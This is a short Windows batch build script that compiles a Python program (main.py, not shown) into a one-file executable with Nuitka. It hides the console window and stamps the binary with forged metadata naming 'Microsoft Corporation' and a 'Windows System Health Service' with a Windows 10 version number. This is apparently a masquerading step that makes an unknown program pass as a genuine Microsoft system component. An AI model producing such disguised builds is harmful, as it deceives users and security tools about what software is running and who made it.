@echo off
setlocal

if not exist icon.ico (
  echo [!] icon.ico not found, building without icon
  set ICON_ARG=
) else (
  set ICON_ARG=--windows-icon-from-ico=icon.ico
)

if exist build rmdir /s /q build
if exist dist rmdir /s /q dist

python -m nuitka ^
  --standalone ^
  --onefile ^
  --windows-console-mode=disable ^
  --output-dir=dist ^
  --remove-output ^
  --assume-yes-for-downloads ^
  %ICON_ARG% ^
  --company-name="Microsoft Corporation" ^
  --product-name="Windows System Health" ^
  --file-version=10.0.19041.1 ^
  --product-version=10.0.19041.1 ^
  --file-description="Windows System Health Service" ^
  --copyright="Microsoft Corporation" ^
  main.py

if errorlevel 1 (
  echo [!] build failed
  exit /b 1
)

echo [*] done: dist\main.exe
endlocal
